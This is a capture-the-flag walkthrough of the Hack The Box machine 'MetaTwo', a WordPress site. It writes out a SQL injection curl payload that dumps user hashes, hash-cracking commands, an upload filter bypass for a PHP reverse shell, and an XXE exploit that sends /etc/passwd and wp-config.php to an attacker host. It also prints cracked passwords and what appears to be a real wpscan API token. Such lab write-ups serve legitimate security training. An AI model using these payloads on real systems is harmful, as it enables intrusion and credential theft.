**Target: 10.129.67.137  MetaTwo**

**Initial Access:**\
nmap -Pn 10.129.67.137 --min-rate=5000 -p- |grep open |awk -F '/' '{print $1}'|tr '\n' ',' \
Output shows open ports:  21,22,80

Enumerating these open ports further with nmap:\
nmap -Pn 10.129.67.137 --min-rate=5000 -p 21,22,80 -sC -sV -oN nmap.metatwo

![image](https://user-images.githubusercontent.com/93153300/199615632-674041d2-1937-4db2-8eb1-a973554c8546.png)

Going to port 80 doesn’t work, it shows the page redirected to http://metapress.htb.  Add this to /etc/hosts: 10.129.67.137  metapress.htb.   Now we can navigate to port 80.   It looks like a wordpress site: 

![image](https://user-images.githubusercontent.com/93153300/199615660-f8db94f0-c89c-4ffd-84f2-c86eca87531d.png)

Checking the wappalyzer browser extension confirms it is using wordpress.  Enumerate the page with command: wpscan --url http://metapress.htb/ -e ap --api-token vBj9MmyA7T9PZpfraoqfja1DFuqMewNolDsdwzZvSAc --plugins-detection mixed \
Output shows:

![image](https://user-images.githubusercontent.com/93153300/199615684-b8bb4887-76d6-4392-ac43-b4ebba1f37c9.png)
  
Found a sql injection.  Go to the link wpscan gave us → https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357.  The site shows a proof of concept for the sql injection we found:

![image](https://user-images.githubusercontent.com/93153300/199615752-d8a2f002-8e05-43c4-b846-174a62296223.png)
 
Running the command in the proof of concept doesn’t work, it says: {"variant":"error","title":"Error","msg":"Sorry, Your request can not process due to security reason."} 

This is because we need to change the _wpnonce value to the value for our specific instance.  To get the _wpnonce value, let’s look back at http://metapress.htb:

![image](https://user-images.githubusercontent.com/93153300/199615765-32a69f6d-d70a-4cef-95ec-8bba6e9afc70.png)


It shows we can click on http://metapress.htb/events, click on that and it takes us to the /events directory: 

![image](https://user-images.githubusercontent.com/93153300/199615799-225f8a1b-d633-434a-935b-976cf1d73cc3.png)
 
The page shows we can click on ‘Startup Meeting’.  In order to see what is going on behind the scenes when we click on ‘Startup Meeting’, capture the request in burp suite.  Open burp suite , turn  intercept on, and configure the browser to send requests through burp suite.  Can do this in the browser proxy settings or use something like foxy proxy.  Click on ‘Startup Meeting’, burp suite captured the request:

![image](https://user-images.githubusercontent.com/93153300/199615840-3198d2d6-283f-4e28-9f47-049f3c824920.png)

In our capture on burp suite it said _wpnonce=bf38a32c79.  Update the _wpnonce in the proof of concept for the sql injection.  \
Running the proof of concept works this time, it outputs the version 10.5.15-MariaDB-0+deb11u1.   Use the sql injection to find usernames and passwords with command:\
curl 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=bf38a32c79&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -'

![image](https://user-images.githubusercontent.com/93153300/199615871-5e1a2cf1-5c9e-44ec-9ff1-97493ef69478.png)

Found 2 users and 2 hashed passwords.  \
Can also do this with sqlmap:\
Step 1:  Take the burp suite request we captured above and save it as a file, we will call it burp. \
Step 2: sqlmap -r burp --batch -p total_service -dbs -D blog --tables -T wp_users --columns -C user_login,user_pass --dump

![image](https://user-images.githubusercontent.com/93153300/199615901-ec250991-54fe-437b-9ec5-14d08631bd21.png)

Copy the hashed passwords and paste them into a file (we will call the file hash). Place each hash on a seperate line within that file.  If you got the hashes using the curl way we showed, then make sure to remove the backslash in the manager hash.  Manager’s hash should look like this: $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
 
We will use hashcat to crack these hashes.  In order to crack these we need to tell hashcat the type of hashes we have.  Use command nth:   nth -f hash.  The command returns an output of:

![image](https://user-images.githubusercontent.com/93153300/199615945-a0e3728c-cebb-4c0c-a40b-76a0cf1ac3d4.png)
Crack the hashes with command: hashcat -m 400 hash /usr/share/wordlists/rockyou.txt\
User manager hash cracked, the password is: partylikearockstar

Wordpress has a standard directory /wp-login.php that is used for logging in (If we didn’t know this we can easily find it by running a quick directory brute force on http://metapress.htb).   Use the found credentials to log in.  The site shows that it has an upload page:

![image](https://user-images.githubusercontent.com/93153300/199615966-eb275c19-09a9-41cf-91e9-471666af1a88.png)
 
After some trial and error, seems that there are 2 security filters in place.  It checks the file extension, so you cannot upload a .php file.  Second, it checks the beginning magic numbers of the file.  To bypass these filters do the following:\
Change the file extension from .php to .php.jpg.  \
Change the beginning magic numbers to jpg magic numbers (FF D8 FF E0) with command: hexeditor -n <filename> → change first 4 columns to FF D8 FF E0

Now it allows the upload. Upload a php pentest monkey reverse shell and apply the two changes mentioned to bypass the security filters (I gave it a filename of friends.php.jpg).  After the upload finishes, it shows the file we uploaded.  Clicking on the uploaded file gives the url where the file is stored (bottom right where it says File URL): 

![image](https://user-images.githubusercontent.com/93153300/199616010-a9ab15f7-eba2-421c-b56d-32d6355c8ae0.png)

Open nc listener: nc -lvnp 443.  However, visiting the location of the file, won’t run the upload.  Seems like a rabbit hole. \
Going back to the wpscan we ran earlier, there’s an authenticated xxe exploit it found:

![image](https://user-images.githubusercontent.com/93153300/199616028-f47bbf8e-3c08-45f1-8654-697ec8a26a39.png)

Search for the exploit with command: searchsploit wordpress|grep -i xxe   → found exploit: \
WordPress 5.7 - 'Media Library' XML External Entity Injection (XXE)  | php/webapps/50304.sh

Download the exploit with command: searchsploit -m 50304.sh.\
Reading through 50304.sh exploit, we see that the exploit is doing the following actions:\
Step 1:  log in to wordpress with credentials \
Step 2: create a malicious .wav and .dtd files.   \
Step 3: get the _wpnonce.\
Step 4: using the wordpress upload functions, it uploads the malicious .wav file. \
Step 5: create files to receive the information from the target (50304.sh calls it serversniffer) \
Step 6: Take the encoded files received and decode them.

To run the exploit: bash 50304.sh metapress.htb manager partylikearockstar /etc/passwd  ```<LHOST>``` \
It worked, we got back the target /etc/passwd file information: 

![image](https://user-images.githubusercontent.com/93153300/199616039-aaecc84a-1f98-4efd-a255-c7b761e8e542.png)
 
The output from /etc/passwd shows a user jnelson.\
Change the /etc/passwd to  ../wp-config.php to get credentials: \
bash 50304.sh metapress.htb manager partylikearockstar /etc/passwd  ```<LHOST>```:

![image](https://user-images.githubusercontent.com/93153300/199616065-58e555d6-3f96-4112-9292-4a8480112c15.png)
 
Found 2 sets of credentials.  The MySQL credentials are user blog, password 635Aq@TdqrCwXFUZ.  The ftp credentials are user metapress.htb, password 9NYS_ii@FyL_p5M2NvJ.  

Log into ftp with command: ftp metapress.htb@metapress.htb → when prompted enter the password  9NYS_ii@FyL_p5M2NvJ.  Go into directory mailer:

![image](https://user-images.githubusercontent.com/93153300/199616079-82fa080a-3da1-4ba5-8222-8557e77a8342.png)
 
Read contents of send_email.php with command: get send_email.php -

![image](https://user-images.githubusercontent.com/93153300/199616104-49b4042b-6dd9-44da-ae32-97adc89ef45d.png)

Found credentials for user jnelson.\
ssh jnelson@metapress.htb → when prompted enter the password \
We have shell as jnelson, can read the flag at /home/jnelson/user.txt
_______________________________________________________________
**Privilege Escalation:**\
Go to directory /home/jnelson/.passpie.  Download the .keys file (it’s a private pgp key). \
Next go to /home/jnelson/.passpie/ssh.  Download the root.pass file.\
Opening the root.pass file shows:

![image](https://user-images.githubusercontent.com/93153300/199616129-9f305e90-a0c1-476e-801f-f6d8f4f47723.png)


The root.pass file contains root’s password, but it’s in the form of an encrypted pgp message. We will use the private pgp key file (.keys file) together with a command called gpg to decrypt it.\
To decrypt it use command: gpg –import .keys.   It asks us for a passphrase.  So before we go to decrypting the files, we will need to find a passphrase. 

Use john to get the passphrase. \
Step 1: John needs to convert the key to a hash he can use.  To do this conversion we need to do two things.  

*	Step A: John can only do this conversion with one key in the file, if the file contains more than one key it will not work.  Open ‘.keys’ file and check if it  is one key or more. The ‘.keys’ file shows 2 keys.  Copy one key and create a new file with it, we will call the file ‘privatekey’.
*	Step B:  Run command: gpg2john privatekey > hash 

Step 2: Run command: john hash –wordlist=/usr/share/wordlists/rockyou.txt.  Found passphrase:  blink182. \
Step 3: Run command: gpg –import .keys  → when prompted enter the passphrase blink182. 
*	It might not ask for a passphrase again, and cause this to not work.  This is due to gpg caching the first passphrase you entered and reusing it.  If this is the case for you, then a quick and easy solution is to just switch to a different user for this part (can switch to user root or any other user on your pc, as gpg only cached it for the user you used). 

Step 4: Root.pass has a pgp message, but it also has other information.  To decrypt the message, we need a file that only contains the message.  Copy the message and create a file with that message and call it rootpgpmessage.  \
Step 5: Run command: gpg -d rootpgpmessage

The message decrypted is p7qfAZt4_A1xo_0x \
This is root’s password.  Back to the jnelson shell we have, run command: su → when prompted enter the password p7qfAZt4_A1xo_0x. \
We have shell as root, can get the flag at /root/root.txt

